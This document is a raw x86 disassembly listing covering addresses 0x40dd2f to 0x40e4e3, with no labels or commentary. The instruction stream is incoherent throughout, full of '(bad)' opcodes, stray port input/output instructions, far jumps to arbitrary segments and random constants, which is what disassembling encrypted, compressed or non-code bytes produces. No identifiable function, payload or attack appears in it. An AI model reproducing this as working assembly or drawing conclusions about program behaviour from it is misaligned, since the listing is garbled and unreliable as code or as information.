  40dd2f:	pusha  
  40dd30:	sbb    eax,0x65e6fbee
  40dd35:	outs   dx,DWORD PTR ds:[esi]
  40dd36:	repz mov esi,0x5f4df8fc
  40dd3c:	in     al,dx
  40dd3d:	sbb    eax,0xf6d4cc18
  40dd42:	clc    
  40dd43:	xor    eax,0xcb8339f6
  40dd48:	leave  
  40dd49:	test   al,0x64
  40dd4b:	test   eax,0xd52d8487
  40dd50:	inc    edi
  40dd51:	(bad)  
  40dd52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd53:	push   0x2f
  40dd55:	adc    BYTE PTR [ebx+0x795ea507],ah
  40dd5b:	sbb    al,0x74
  40dd5d:	data16 out 0xee,al
  40dd60:	sbb    ch,dl
  40dd62:	into   
  40dd63:	pushf  
  40dd64:	mov    DWORD PTR [ecx+0x589ddaaa],edi
  40dd6a:	mov    esi,0x25a1f3f7
  40dd6f:	cmp    bl,BYTE PTR [ecx+0x1]
  40dd72:	pop    esi
  40dd73:	xchg   ebp,eax
  40dd74:	xor    dl,0x9f
  40dd77:	pop    edi
  40dd78:	xchg   BYTE PTR [eax+0x4],dh
  40dd7b:	ret    0xb096
  40dd7e:	retf   0x51d5
  40dd81:	sbb    eax,0x61ebac0f
  40dd86:	or     BYTE PTR [ecx-0x6f44d109],dl
  40dd8c:	test   DWORD PTR [esi-0x36],esi
  40dd8f:	das    
  40dd90:	dec    edx
  40dd91:	in     eax,dx
  40dd92:	jmp    0x2b3a:0x7e592291
  40dd99:	or     BYTE PTR [eax],ah
  40dd9b:	(bad)  
  40dd9c:	dec    bl
  40dd9e:	mov    eax,0x32cca243
  40dda3:	ss push cs
  40dda5:	sub    BYTE PTR [ecx-0xe],dh
  40dda8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dda9:	sbb    al,0x8b
  40ddab:	fidivr WORD PTR [ebp-0x5525161a]
  40ddb1:	test   DWORD PTR [eax-0x18],edx
  40ddb4:	and    al,0x85
  40ddb6:	in     eax,0x83
  40ddb8:	test   edi,esp
  40ddba:	mov    WORD PTR [edi],?
  40ddbc:	push   0xb4cef03d
  40ddc1:	xor    DWORD PTR [esi-0x204b2b79],edx
  40ddc7:	sbb    al,dl
  40ddc9:	mov    DWORD PTR [edx-0x64],ebx
  40ddcc:	adc    BYTE PTR [ecx+0x2074082b],al
  40ddd2:	inc    esi
  40ddd3:	aaa    
  40ddd4:	sub    eax,0x198d101
  40ddd9:	addr16 jmp 0xf025:0x83e89d90
  40dde1:	test   BYTE PTR [esp+eax*4-0xa245a3d],bh
  40dde8:	inc    ecx
  40dde9:	pusha  
  40ddea:	add    eax,0x8e40cf8b
  40ddef:	mov    ecx,0xe5ffa8d0
  40ddf4:	fsub   QWORD PTR [edx-0x2e]
  40ddf7:	dec    ecx
  40ddf8:	test   BYTE PTR [eax],ch
  40ddfa:	push   0xdacb6e81
  40ddff:	xchg   DWORD PTR [eax],ebx
  40de01:	add    bh,BYTE PTR [ebx]
  40de03:	mov    bh,0xb1
  40de05:	and    BYTE PTR [ebx+0x5cafb2f7],al
  40de0b:	push   ss
  40de0c:	ds ss aam 0x74
  40de10:	test   eax,0xdcd531be
  40de15:	jl     0x40de3f
  40de17:	aaa    
  40de18:	push   cs
  40de19:	nop
  40de1a:	push   ebx
  40de1b:	aas    
  40de1c:	sub    dh,al
  40de1e:	cmp    bh,BYTE PTR [esi-0xc]
  40de21:	imul   ecx,ebp,0x45f05129
  40de27:	push   ss
  40de28:	retf   0x26f0
  40de2b:	xor    dh,cl
  40de2d:	je     0x40de72
  40de2f:	ins    BYTE PTR es:[edi],dx
  40de30:	mov    eax,0xfd4355be
  40de35:	sti    
  40de36:	mov    esp,ecx
  40de38:	push   ss
  40de39:	out    dx,al
  40de3a:	retf   0x81e1
  40de3d:	jo     0x40de45
  40de3f:	push   ebp
  40de40:	inc    edi
  40de41:	dec    ebp
  40de42:	addr16 ss cwde 
  40de45:	or     eax,0x459f7e22
  40de4a:	je     0x40de2c
  40de4c:	fiadd  WORD PTR [ebp-0x1347d8bb]
  40de52:	mov    DWORD PTR [ebx-0x47e4a2f3],eax
  40de58:	daa    
  40de59:	xchg   ebx,eax
  40de5a:	ja     0x40ddf8
  40de5c:	pop    edx
  40de5d:	fcmovb st,st(5)
  40de5f:	shl    edx,0x11
  40de62:	add    eax,0x6242529e
  40de67:	push   ecx
  40de68:	xor    al,0xea
  40de6a:	pop    ebp
  40de6b:	gs and eax,0xba111f73
  40de71:	sub    cl,BYTE PTR [ebx]
  40de73:	cld    
  40de74:	mov    bh,dh
  40de76:	stc    
  40de77:	out    dx,eax
  40de78:	jmp    0xc9ce:0xfeea2c2f
  40de7f:	and    eax,0x441f87fd
  40de84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de85:	mov    ch,BYTE PTR [esp+edi*8-0x5cfc9feb]
  40de8c:	xor    al,0x25
  40de8e:	adc    al,0x1b
  40de90:	inc    ebp
  40de91:	xor    ecx,DWORD PTR [edi+0x1adc7cba]
  40de97:	call   DWORD PTR [ebp-0x5bd292af]
  40de9d:	dec    esp
  40de9e:	iret   
  40de9f:	add    esi,DWORD PTR [edx-0x19]
  40dea2:	pop    esi
  40dea3:	ret    0xed5a
  40dea6:	int3   
  40dea7:	rcl    DWORD PTR [edx-0x346b1a46],cl
  40dead:	mov    ebx,0xb42d662a
  40deb2:	inc    ebx
  40deb3:	xor    dh,BYTE PTR [edx]
  40deb5:	mov    ds:0xa078e166,eax
  40deba:	sar    DWORD PTR [esi-0x70],cl
  40debd:	ds pop ss
  40debf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec0:	mov    WORD PTR [edi],?
  40dec2:	push   ds
  40dec3:	into   
  40dec4:	pop    esp
  40dec5:	xchg   DWORD PTR [edx+0x3b6faa0d],esp
  40decb:	mov    eax,0x34421f4e
  40ded0:	xchg   edx,eax
  40ded1:	dec    ecx
  40ded2:	jns    0x40def2
  40ded4:	and    cl,BYTE PTR [edx-0x67]
  40ded7:	cmp    dh,BYTE PTR ds:0x2ffe7010
  40dedd:	ffree  st(1)
  40dedf:	add    BYTE PTR [ecx+0x11],0x82
  40dee3:	popa   
  40dee4:	cmc    
  40dee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee6:	aaa    
  40dee7:	add    BYTE PTR [edx-0x9],dh
  40deea:	and    bh,BYTE PTR [eax+esi*8-0x2a]
  40deee:	loop   0x40dece
  40def0:	sub    ebx,DWORD PTR [edi+0x4d001d58]
  40def6:	into   
  40def7:	cmp    eax,0x1204090d
  40defc:	in     eax,0xfc
  40defe:	in     al,dx
  40deff:	push   eax
  40df00:	mov    ch,dl
  40df02:	add    al,0x22
  40df04:	mov    cs,WORD PTR [edx+0x30]
  40df07:	lods   eax,DWORD PTR ds:[esi]
  40df08:	les    eax,FWORD PTR [ebp-0x68]
  40df0b:	fsubr  QWORD PTR [esi]
  40df0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df0e:	sub    cl,BYTE PTR [edx-0x1f31047]
  40df14:	jns    0x40df42
  40df16:	cwde   
  40df17:	test   DWORD PTR [eax-0x78b950dd],edx
  40df1d:	mov    ds,WORD PTR [edx-0x9fa80b4]
  40df23:	pop    edi
  40df24:	out    dx,eax
  40df25:	in     eax,dx
  40df26:	cmp    BYTE PTR [ebp-0x66],0x3
  40df2a:	add    DWORD PTR [edi-0x12],ebx
  40df2d:	jmp    ecx
  40df2f:	in     al,0xb9
  40df31:	sub    DWORD PTR [ebx+0x78],0xebf3d054
  40df38:	loopne 0x40df80
  40df3a:	mov    esi,0xcfda1347
  40df3f:	adc    al,cl
  40df41:	std    
  40df42:	or     edx,DWORD PTR [edx+0x2]
  40df45:	cli    
  40df46:	xor    bl,BYTE PTR [esi]
  40df48:	push   ebp
  40df49:	pushf  
  40df4a:	out    dx,eax
  40df4b:	and    BYTE PTR [edi+0x79de74d7],0x41
  40df52:	out    0xbd,eax
  40df54:	mov    al,0x62
  40df56:	rcr    BYTE PTR [edi],0x2
  40df59:	xor    al,0x8e
  40df5b:	mov    ecx,0x77ba5959
  40df60:	je     0x40df15
  40df62:	push   esi
  40df63:	pusha  
  40df64:	dec    eax
  40df65:	or     BYTE PTR [bp+di],bl
  40df68:	cmp    al,0x89
  40df6a:	out    0xda,eax
  40df6c:	imul   ebx,DWORD PTR [edx+0x1468d8e],0xffffffc7
  40df73:	fs jge 0x40dff5
  40df76:	push   ss
  40df77:	icebp  
  40df78:	add    dh,dh
  40df7a:	repnz xchg bh,cl
  40df7d:	repnz and ah,bl
  40df80:	or     al,0xc0
  40df82:	mov    bh,BYTE PTR [edi]
  40df84:	dec    edx
  40df85:	stos   BYTE PTR es:[edi],al
  40df86:	push   ebp
  40df87:	sub    ebp,DWORD PTR [ecx]
  40df89:	push   ecx
  40df8a:	mov    cs,WORD PTR [eax]
  40df8c:	sub    BYTE PTR [edi+0x31763042],dl
  40df92:	lock fidivr DWORD PTR [ebp-0x651f5a2]
  40df99:	and    esi,DWORD PTR [edx-0x1a]
  40df9c:	aad    0x7e
  40df9e:	mov    al,0x58
  40dfa0:	repnz arpl WORD PTR [edx-0x61927dbb],sp
  40dfa7:	jmp    0xb48bebac
  40dfac:	fidiv  DWORD PTR [ebx]
  40dfae:	adc    DWORD PTR [esi+0xdba9f6b],eax
  40dfb4:	gs push ss
  40dfb6:	push   esi
  40dfb7:	add    BYTE PTR ds:0x3f2abc11,al
  40dfbd:	jo     0x40dfc4
  40dfbf:	call   0xbc1f40fa
  40dfc4:	pop    edx
  40dfc5:	std    
  40dfc6:	cmp    BYTE PTR [eax],bl
  40dfc8:	jp     0x40df96
  40dfca:	cli    
  40dfcb:	neg    esp
  40dfcd:	int3   
  40dfce:	fs in  eax,dx
  40dfd0:	ins    DWORD PTR es:[edi],dx
  40dfd1:	xor    al,0x8e
  40dfd3:	jmp    0xb511:0x3766dd8c
  40dfda:	sub    dh,BYTE PTR [ecx+0x757aa0f3]
  40dfe0:	push   ecx
  40dfe1:	adc    esp,DWORD PTR [ebp+0x52]
  40dfe4:	cmc    
  40dfe5:	inc    edx
  40dfe6:	lock iret 
  40dfe8:	mov    ch,0xc9
  40dfea:	mov    ah,0x89
  40dfec:	or     ebp,esp
  40dfee:	repnz lods al,BYTE PTR ds:[esi]
  40dff0:	neg    BYTE PTR [edx+0x9]
  40dff3:	and    eax,0xefa16f1d
  40dff8:	retf   
  40dff9:	sub    DWORD PTR [ebp+edx*2-0x26],eax
  40dffd:	test   BYTE PTR [ecx+esi*4-0x1724eadd],al
  40e004:	xor    ecx,DWORD PTR [edx+ebx*8]
  40e007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e008:	mov    edx,0x1f08c78c
  40e00d:	sub    cl,BYTE PTR ds:0x6172ff5f
  40e013:	stc    
  40e014:	xor    al,0x79
  40e016:	jne    0x40e07a
  40e018:	mov    ebp,0x886abdf1
  40e01d:	add    eax,0xa82e119c
  40e022:	ds pop edi
  40e024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e025:	jne    0x40e08b
  40e027:	pop    ecx
  40e028:	mov    BYTE PTR [esi+0xa545f05],ch
  40e02e:	inc    ebx
  40e02f:	dec    edx
  40e030:	xor    ah,bl
  40e032:	or     DWORD PTR [ecx-0x3b],ecx
  40e035:	adc    esi,DWORD PTR [ebp-0x8e28aa]
  40e03b:	popf   
  40e03c:	add    esp,ebp
  40e03e:	ror    DWORD PTR [edi+0x167fedb4],0x98
  40e045:	add    ecx,ebp
  40e047:	cli    
  40e048:	call   0x5080:0x32d3c924
  40e04f:	out    dx,eax
  40e050:	or     ecx,ebp
  40e052:	adc    BYTE PTR [esi],ch
  40e054:	cs cdq 
  40e056:	push   esp
  40e057:	cmp    ecx,ebx
  40e059:	mov    eax,ds:0x51830cd
  40e05e:	sbb    al,0x4d
  40e060:	jle    0x40e080
  40e062:	test   DWORD PTR [edi-0x78],edx
  40e065:	in     al,0xf6
  40e067:	nop
  40e068:	xor    BYTE PTR [ebx],bh
  40e06a:	pop    ss
  40e06b:	mov    ds:0x7159a6cf,eax
  40e070:	mov    ecx,0x9ae235b8
  40e075:	inc    esp
  40e076:	mov    ds:0x726b171a,al
  40e07b:	add    al,0x7d
  40e07d:	jge    0x40e0ee
  40e07f:	icebp  
  40e080:	clc    
  40e081:	push   ebp
  40e082:	adc    al,0xf8
  40e084:	div    DWORD PTR [esi-0x74]
  40e087:	push   0xffffffc3
  40e089:	xchg   BYTE PTR [edi],al
  40e08b:	sbb    cl,BYTE PTR [esp+ebx*8-0x6eb22078]
  40e092:	and    al,0xce
  40e094:	sbb    bh,ah
  40e096:	xchg   DWORD PTR ds:0xaa49eb06,ebx
  40e09c:	mov    ds:0x77a64c73,al
  40e0a1:	jns    0x40e02f
  40e0a3:	mov    WORD PTR [ebp+0x44],?
  40e0a6:	xor    DWORD PTR [esp+eax*8],0x1a831033
  40e0ad:	push   ds
  40e0ae:	add    ch,BYTE PTR [edi+0x34853346]
  40e0b4:	cmp    al,0xa4
  40e0b6:	jmp    DWORD PTR [eax-0x260ab42]
  40e0bc:	scas   eax,DWORD PTR es:[edi]
  40e0bd:	and    cl,BYTE PTR [eax]
  40e0bf:	mov    ecx,0x1af3d4fb
  40e0c4:	imul   ecx,DWORD PTR [ebp+esi*1-0x28e537d1],0x4b
  40e0cc:	pop    ebp
  40e0cd:	mov    esi,0x45e2e7a3
  40e0d2:	jnp    0x40e054
  40e0d4:	retf   
  40e0d5:	mov    eax,ds:0xe6f2ee64
  40e0da:	lea    esp,[ebx]
  40e0dc:	mov    ebp,DWORD PTR [ebp+0x1ff2fad8]
  40e0e2:	xor    eax,0x7477230f
  40e0e7:	sub    ah,ch
  40e0e9:	test   eax,0x70084fe5
  40e0ef:	(bad)  
  40e0f0:	pushf  
  40e0f1:	inc    ecx
  40e0f2:	sub    al,0x5b
  40e0f4:	ss dec esi
  40e0f6:	iret   
  40e0f7:	add    edi,DWORD PTR [ebp-0x55334807]
  40e0fd:	(bad)  
  40e0fe:	mov    ds:0xf4db1ad3,al
  40e103:	(bad)  
  40e104:	mov    ebp,0x4e0a4ae
  40e109:	aad    0xc0
  40e10b:	jge    0x40e099
  40e10d:	xor    eax,0x5e01600e
  40e112:	cmp    edx,DWORD PTR [eax-0x6214dccd]
  40e118:	jmp    0x915775fc
  40e11d:	mov    ds:0xc16f18c8,eax
  40e122:	jp     0x40e0eb
  40e124:	adc    BYTE PTR ss:[ecx+0x14],0x8f
  40e129:	sub    DWORD PTR [esi+edx*1-0x59],edi
  40e12d:	repnz xor DWORD PTR [ebp-0x20],esp
  40e131:	rcl    edi,0xa1
  40e134:	inc    edx
  40e135:	adc    al,0x76
  40e137:	fst    DWORD PTR [eax+0x2b]
  40e13a:	mov    cl,0x7d
  40e13c:	xchg   edi,eax
  40e13d:	popa   
  40e13e:	pop    edi
  40e13f:	jnp    0x40e0f1
  40e141:	fadd   QWORD PTR [eax-0x41]
  40e144:	ss out dx,al
  40e146:	imul   edi,DWORD PTR [eax+0x1d],0x21
  40e14a:	stos   DWORD PTR es:[edi],eax
  40e14b:	sub    al,0xeb
  40e14d:	call   0x917a:0xcbac81e9
  40e154:	push   0xffffffa9
  40e156:	adc    DWORD PTR [eax+0x6b],edi
  40e159:	mov    ecx,ebp
  40e15b:	(bad)  
  40e15c:	xchg   edx,eax
  40e15d:	ret    
  40e15e:	xchg   ecx,eax
  40e15f:	in     al,0x64
  40e161:	out    0x60,eax
  40e163:	stos   DWORD PTR es:[edi],eax
  40e164:	test   al,0xcb
  40e166:	and    eax,0xaef09127
  40e16b:	and    al,0xc1
  40e16d:	jmp    0xc3758e23
  40e172:	pop    ebp
  40e173:	bound  ecx,QWORD PTR [eax-0x1657a5aa]
  40e179:	push   edi
  40e17a:	shl    DWORD PTR [edi+0x77],0x61
  40e17e:	or     eax,0x3930506a
  40e183:	sbb    ah,ah
  40e185:	jp     0x40e151
  40e187:	arpl   WORD PTR gs:[esi-0x2c],ax
  40e18b:	mov    ?,WORD PTR [edx]
  40e18d:	xchg   edx,eax
  40e18e:	aad    0x48
  40e190:	jmp    0x7026:0x123ffffa
  40e197:	push   edi
  40e198:	cld    
  40e199:	aas    
  40e19a:	in     eax,dx
  40e19b:	jo     0x40e12b
  40e19d:	loop   0x40e193
  40e19f:	add    eax,eax
  40e1a1:	jne    0x40e1a4
  40e1a3:	cs jmp 0x41c0:0xd9686bd7
  40e1ab:	and    DWORD PTR ds:0x73dc9909,0x3ea3a5ca
  40e1b5:	adc    al,0xe6
  40e1b7:	jae    0x40e1f0
  40e1b9:	pop    eax
  40e1ba:	scas   al,BYTE PTR es:[edi]
  40e1bb:	or     ebp,DWORD PTR [ebx+0xe03c492]
  40e1c1:	fild   DWORD PTR [eax]
  40e1c3:	test   al,0x67
  40e1c5:	mov    cl,0xdb
  40e1c7:	pop    esi
  40e1c8:	adc    ch,ch
  40e1ca:	dec    ecx
  40e1cb:	and    eax,DWORD PTR [ecx+eiz*4+0x1e4fd04a]
  40e1d2:	jp     0x40e195
  40e1d4:	pushf  
  40e1d5:	adc    BYTE PTR [esi],bh
  40e1d7:	(bad)  [ebp-0x646e4a5e]
  40e1dd:	in     eax,dx
  40e1de:	jno    0x40e20a
  40e1e0:	retf   0xd06e
  40e1e3:	sar    DWORD PTR [ebx],0x61
  40e1e6:	movntq (bad),mm7
  40e1e7:	out    0xfd,eax
  40e1e9:	sbb    esi,DWORD PTR [ecx+eiz*1-0x7c]
  40e1ed:	test   al,0x4a
  40e1ef:	fadd   QWORD PTR [edi-0x17666d00]
  40e1f5:	(bad)  
  40e1f7:	mov    eax,0x2c680b7
  40e1fc:	jmp    0xb0983723
  40e201:	push   ecx
  40e202:	pop    ecx
  40e203:	out    0xb8,eax
  40e205:	rcr    ebx,0x38
  40e208:	iret   
  40e209:	xchg   ebp,eax
  40e20a:	fwait
  40e20b:	jns    0x40e1e5
  40e20d:	dec    esi
  40e20e:	add    BYTE PTR [edi+0x7f7059c4],0xc4
  40e215:	out    0xcc,al
  40e217:	pop    esi
  40e218:	cmp    ch,BYTE PTR [edx-0x7f492083]
  40e21e:	das    
  40e21f:	in     eax,0xa9
  40e221:	cmp    edi,edi
  40e223:	inc    ecx
  40e224:	out    dx,al
  40e225:	inc    edi
  40e226:	or     eax,0xf4cfb667
  40e22b:	retf   
  40e22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e22d:	pop    es
  40e22e:	sub    al,0x59
  40e230:	push   es
  40e231:	sub    DWORD PTR fs:[esi-0x6bfb7e56],ebx
  40e238:	sbb    BYTE PTR [ecx],0x84
  40e23b:	stos   BYTE PTR es:[edi],al
  40e23c:	xchg   ebp,eax
  40e23d:	mov    edi,0xc2bdb8a5
  40e242:	mov    eax,0x717eae95
  40e247:	sti    
  40e248:	inc    ebx
  40e249:	inc    esp
  40e24a:	xor    ch,ch
  40e24c:	push   0x25
  40e24e:	sub    al,0x34
  40e250:	retf   0x8e37
  40e253:	sub    bh,BYTE PTR [edi+0xf]
  40e256:	dec    ebx
  40e257:	xchg   ecx,eax
  40e258:	xor    al,0xa3
  40e25b:	inc    eax
  40e25c:	xor    eax,0x49742649
  40e261:	dec    edx
  40e262:	xlat   BYTE PTR ds:[ebx]
  40e263:	dec    esi
  40e264:	mov    al,BYTE PTR [eax]
  40e266:	lods   eax,DWORD PTR ds:[esi]
  40e267:	daa    
  40e268:	cdq    
  40e269:	xor    eax,0x9a714e2
  40e26e:	inc    ebp
  40e26f:	mov    ah,0xf8
  40e271:	test   eax,eax
  40e273:	test   al,0x18
  40e276:	dec    edx
  40e277:	mov    eax,ds:0x46753c6f
  40e27c:	mov    ebp,0xca03fd09
  40e281:	sbb    cl,BYTE PTR [ebx+0x3086fe90]
  40e287:	ins    DWORD PTR es:[edi],dx
  40e288:	pop    esi
  40e289:	ins    BYTE PTR es:[edi],dx
  40e28a:	bound  ebx,QWORD PTR [ebx-0x66c9aef2]
  40e290:	out    dx,eax
  40e291:	rcr    ch,cl
  40e293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e294:	and    eax,0x58f9c534
  40e299:	sbb    eax,0x85ea7e17
  40e29e:	mov    edi,0xeb8321ec
  40e2a3:	sti    
  40e2a4:	outs   dx,BYTE PTR ds:[esi]
  40e2a5:	cmp    BYTE PTR [ebx+0x16],cl
  40e2a8:	push   0x8a493a02
  40e2ad:	mov    cl,0x6e
  40e2af:	add    al,0x4e
  40e2b1:	sti    
  40e2b2:	push   eax
  40e2b3:	jl     0x40e262
  40e2b5:	lahf   
  40e2b6:	leave  
  40e2b7:	fs (bad) 
  40e2b9:	and    edx,esi
  40e2bb:	mov    dh,0xa2
  40e2bd:	dec    ebx
  40e2be:	shl    DWORD PTR [eax-0x7e],1
  40e2c1:	mov    es,WORD PTR [eax-0x51]
  40e2c4:	(bad)  
  40e2c5:	mov    BYTE PTR ds:0xdf8b65a,bl
  40e2cb:	or     BYTE PTR [ebx-0x12],ch
  40e2ce:	xor    DWORD PTR [ebx+0x5e],ecx
  40e2d1:	(bad)  
  40e2d2:	push   edi
  40e2d3:	mov    ah,0x70
  40e2d5:	pop    edi
  40e2d6:	cdq    
  40e2d7:	add    dl,ah
  40e2d9:	mov    BYTE PTR [eax],ch
  40e2db:	jecxz  0x40e344
  40e2dd:	and    esi,DWORD PTR [ebx-0x26]
  40e2e0:	aaa    
  40e2e1:	ret    
  40e2e2:	lock sbb BYTE PTR [edx],al
  40e2e5:	sub    DWORD PTR [eax+0xf],edx
  40e2e8:	mov    ebx,0x4b73dca4
  40e2ed:	push   0xff35fa2d
  40e2f2:	add    al,0xf2
  40e2f4:	ror    BYTE PTR [ecx+0xeb96394],cl
  40e2fa:	loopne 0x40e2a6
  40e2fc:	cmp    eax,0x5c393864
  40e301:	push   0x51
  40e303:	adc    eax,0xcbbea322
  40e308:	out    0xc7,eax
  40e30a:	mov    ah,0x61
  40e30c:	vpunpcklwd ymm2,ymm1,YMMWORD PTR [eax]
  40e310:	lods   eax,DWORD PTR ds:[esi]
  40e311:	cli    
  40e312:	hlt    
  40e313:	sub    DWORD PTR [edi],ebp
  40e315:	mov    ds:0xf0016d15,eax
  40e31a:	int    0x5c
  40e31c:	xchg   DWORD PTR [ecx+esi*1-0xa],esi
  40e320:	push   cs
  40e321:	loopne 0x40e370
  40e323:	arpl   WORD PTR [ebx],bp
  40e325:	push   eax
  40e326:	je     0x40e2c2
  40e328:	lock hlt 
  40e32a:	cmp    edx,edx
  40e32c:	(bad)  
  40e32d:	or     al,0x8f
  40e32f:	adc    al,cl
  40e331:	and    DWORD PTR ds:0x6c857f9e,eax
  40e337:	jle    0x40e2c6
  40e339:	nop
  40e33a:	mov    bp,0x35ce
  40e33e:	cdq    
  40e33f:	or     BYTE PTR [esi],0xec
  40e342:	mov    edx,edi
  40e344:	mov    BYTE PTR [esi+0x6f],bl
  40e347:	in     eax,dx
  40e348:	add    al,0xd6
  40e34a:	inc    ebp
  40e34b:	nop
  40e34c:	aaa    
  40e34d:	xchg   ecx,eax
  40e34e:	fist   WORD PTR [esp+edx*4-0xb]
  40e352:	xor    eax,0xcf16f9f9
  40e357:	inc    esp
  40e358:	and    BYTE PTR [eax-0x2c],al
  40e35b:	dec    esp
  40e35c:	mov    eax,0x51ac2bb0
  40e361:	fsub   st,st(5)
  40e363:	bound  eax,QWORD PTR [ebx-0x62]
  40e366:	and    eax,0x3c3ae6ca
  40e36b:	popa   
  40e36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e36d:	mov    ebp,0xe2cf31f4
  40e372:	lods   eax,DWORD PTR ds:[esi]
  40e373:	xchg   esi,eax
  40e374:	jecxz  0x40e3aa
  40e376:	cwde   
  40e377:	fwait
  40e378:	xor    edi,DWORD PTR [ebx]
  40e37a:	inc    BYTE PTR [ebx-0x4f4e40f3]
  40e380:	fiadd  DWORD PTR [ebx-0x858a0e9]
  40e386:	neg    BYTE PTR [ebp-0x79]
  40e389:	mov    ah,0x9d
  40e38b:	cmc    
  40e38c:	adc    eax,0x9460e01e
  40e391:	dec    ebx
  40e392:	imul   ecx,DWORD PTR [ebx-0x6627c1c4],0xfffffffb
  40e399:	cli    
  40e39a:	sti    
  40e39b:	rol    DWORD PTR [eax-0x7f],0x8a
  40e39f:	fwait
  40e3a0:	enter  0x6354,0xcb
  40e3a4:	data16 repnz icebp 
  40e3a7:	data16 and BYTE PTR [edi+0x12ee1e67],dl
  40e3ae:	call   0x4c22dbcf
  40e3b3:	mov    ds:0x1b367320,eax
  40e3b8:	jb     0x40e383
  40e3ba:	mov    bl,0xad
  40e3bc:	aam    0x1b
  40e3be:	stc    
  40e3bf:	out    0xa8,eax
  40e3c1:	push   ss
  40e3c2:	and    eax,0x2b81d65b
  40e3c7:	mov    ds:0x595e279a,al
  40e3cc:	lods   al,BYTE PTR ds:[esi]
  40e3cd:	xor    dh,BYTE PTR [esi]
  40e3cf:	mov    eax,0x6d1d307e
  40e3d4:	mov    al,ds:0x61566b3d
  40e3d9:	inc    DWORD PTR [ebx]
  40e3db:	clc    
  40e3dc:	icebp  
  40e3dd:	sbb    DWORD PTR [ebx-0x20],ebx
  40e3e0:	mov    ds:0x8367fef6,eax
  40e3e5:	in     al,0x63
  40e3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3e9:	or     ch,BYTE PTR [ecx+0x625ed7ec]
  40e3ef:	daa    
  40e3f0:	lods   eax,DWORD PTR ds:[esi]
  40e3f1:	xchg   ebx,eax
  40e3f2:	inc    edx
  40e3f3:	shr    DWORD PTR [ebx],cl
  40e3f5:	xor    BYTE PTR ds:0x99ba0a72,ch
  40e3fb:	rcl    dh,0x92
  40e3fe:	push   ds
  40e3ff:	gs cmc 
  40e401:	ret    
  40e402:	pop    esp
  40e403:	ins    BYTE PTR es:[edi],dx
  40e404:	adc    al,BYTE PTR [esp+ecx*2]
  40e407:	sub    ch,BYTE PTR [ecx]
  40e409:	out    0x1c,eax
  40e40b:	mov    ch,0xea
  40e40d:	rcl    DWORD PTR [edi-0xf],cl
  40e410:	into   
  40e411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e412:	aam    0x5d
  40e414:	pop    ss
  40e415:	adc    ch,BYTE PTR [ebx-0x5f]
  40e418:	inc    esp
  40e419:	gs inc ecx
  40e41b:	out    dx,al
  40e41c:	push   esi
  40e41d:	mov    fs,ecx
  40e41f:	daa    
  40e420:	jo     0x40e3f0
  40e422:	and    al,0x4b
  40e424:	xchg   esi,eax
  40e425:	mov    eax,ds:0xf32cc867
  40e42a:	and    eax,0x6e680f67
  40e42f:	outs   dx,BYTE PTR ds:[esi]
  40e430:	push   esi
  40e431:	out    0xbf,eax
  40e433:	sub    ch,BYTE PTR [ecx+esi*1+0x70c5e141]
  40e43a:	sub    BYTE PTR [eax+0x6e],bl
  40e43d:	xchg   edx,eax
  40e43e:	push   ebx
  40e43f:	push   edx
  40e440:	xchg   esp,eax
  40e441:	and    DWORD PTR [edi+ecx*8],ebx
  40e444:	xchg   esp,eax
  40e445:	adc    eax,0x11b5df40
  40e44a:	lock push edi
  40e44c:	es cmp al,0x8f
  40e44f:	maskmovq mm0,(bad)
  40e450:	test   DWORD PTR [esi+0x0],0x63d5c07b
  40e457:	adc    ch,ah
  40e459:	stos   DWORD PTR es:[edi],eax
  40e45a:	aad    0xd7
  40e45c:	cld    
  40e45d:	popf   
  40e45e:	loop   0x40e40c
  40e460:	jp     0x40e4be
  40e462:	adc    DWORD PTR [esi-0x660770ae],ebx
  40e468:	mov    esp,0xc8abc6a1
  40e46d:	push   ebx
  40e46e:	dec    esi
  40e46f:	test   dh,bl
  40e471:	adc    esp,esi
  40e473:	jmp    0x40e41e
  40e475:	push   edx
  40e476:	xor    ecx,ecx
  40e478:	and    DWORD PTR [eax],edi
  40e47a:	sahf   
  40e47b:	cmp    ecx,0x18
  40e47e:	es push ebx
  40e480:	int3   
  40e481:	movlps xmm7,QWORD PTR [edx-0x361399a8]
  40e488:	mov    ebp,DWORD PTR [edi+0xb]
  40e48b:	mov    cl,0xc7
  40e48d:	not    DWORD PTR [ebp+0x8]
  40e490:	inc    esp
  40e491:	or     dh,BYTE PTR [esi]
  40e493:	add    ebp,ebp
  40e495:	and    ebp,DWORD PTR [esi+0x43]
  40e498:	inc    esp
  40e499:	retf   0x4a1a
  40e49c:	sbb    BYTE PTR [edx+0x41],dh
  40e49f:	fwait
  40e4a0:	cmovb  eax,DWORD PTR [ebp-0x2e]
  40e4a4:	mov    bh,0x29
  40e4a6:	mov    dl,0x50
  40e4a8:	sub    BYTE PTR [eax+esi*4-0x36],bh
  40e4ac:	mov    edx,0x1c5eac99
  40e4b1:	out    dx,al
  40e4b2:	(bad)  
  40e4b3:	aaa    
  40e4b4:	repnz ds aaa 
  40e4b7:	xchg   DWORD PTR [ebp+0x2a830050],eax
  40e4bd:	in     al,0x4c
  40e4bf:	jmp    0x40e4c5
  40e4c1:	xor    eax,0xaa3a50a2
  40e4c6:	cs mov bl,0x5b
  40e4c9:	push   esi
  40e4ca:	dec    edx
  40e4cb:	ins    BYTE PTR es:[edi],dx
  40e4cc:	cmp    al,0x93
  40e4ce:	cmp    al,0xc8
  40e4d0:	into   
  40e4d1:	iret   
  40e4d2:	cs mov eax,0xf83d06d5
  40e4d8:	cs ret 
  40e4da:	in     al,0x9e
  40e4dc:	(bad)  
  40e4dd:	out    0x36,al
  40e4df:	addr16 retf 
  40e4e1:	popf   
  40e4e2:	cdq    
  40e4e3:	shl    edi,1
